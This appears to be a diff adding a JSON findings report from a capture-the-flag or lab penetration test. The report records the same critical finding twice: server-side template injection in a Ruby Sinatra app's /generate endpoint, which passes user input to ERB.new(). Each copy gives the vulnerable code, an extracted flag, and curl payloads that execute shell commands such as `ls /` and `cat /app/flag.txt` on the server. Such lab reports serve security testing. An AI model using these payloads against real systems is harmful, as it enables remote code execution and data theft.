@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T09:23:20.481265+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d7eaa7b9-9c83-42d5-8c15-4bc8393d41f5",
+      "timestamp": "2026-04-15T09:23:20.481125+00:00",
+      "title": "ERB Server-Side Template Injection (SSTI) leading to RCE",
+      "severity": "critical",
+      "target": "http://172.17.0.1:46509",
+      "description": "The Ruby Sinatra application passes user input directly to ERB.new() without sanitization in the /generate POST endpoint. The sentence parameter is used as the ERB template string, allowing arbitrary Ruby code execution via <%= %> syntax. Client-side JavaScript validation (regex /^[a-zA-Z0-9\\s]+$/) is trivially bypassed by sending requests directly to the server.",
+      "evidence": "Flag extracted: flag{c4ddca47-533e-432a-b5fa-1503c21c538c}\n\nVulnerable code in app.rb:\n  template = ERB.new(\"#{sentence}\")\n  template.result(binding)\n\nPoC: curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%=7*7%>' --data-urlencode 'number=1' returns 49\n\nPoC: curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%= `ls /` %>' --data-urlencode 'number=1' returns directory listing",
+      "tool_used": "manual_http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%= `cat /app/flag.txt` %>' --data-urlencode 'number=1'",
+        "expected": "Flag content returned in response body"
+      }
+    },
+    {
+      "id": "b842464a-d734-4d63-8f2d-4a2a260ff77d",
+      "timestamp": "2026-04-15T09:23:20.558446+00:00",
+      "title": "ERB Server-Side Template Injection (SSTI) leading to RCE",
+      "severity": "critical",
+      "target": "http://172.17.0.1:46509",
+      "description": "The Ruby Sinatra application passes user input directly to ERB.new() without sanitization in the /generate POST endpoint. The sentence parameter is used as the ERB template string, allowing arbitrary Ruby code execution via <%= %> syntax. Client-side JavaScript validation (regex /^[a-zA-Z0-9\\s]+$/) is trivially bypassed by sending requests directly to the server.",
+      "evidence": "Flag extracted: flag{c4ddca47-533e-432a-b5fa-1503c21c538c}\n\nVulnerable code in app.rb:\n  template = ERB.new(\"#{sentence}\")\n  template.result(binding)\n\nPoC: curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%=7*7%>' --data-urlencode 'number=1' returns 49\n\nPoC: curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%= `ls /` %>' --data-urlencode 'number=1' returns directory listing",
+      "tool_used": "manual_http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%= `cat /app/flag.txt` %>' --data-urlencode 'number=1'",
+        "expected": "Flag content returned in response body"
+      }
+    }
+  ],
+  "diagrams": []
+}
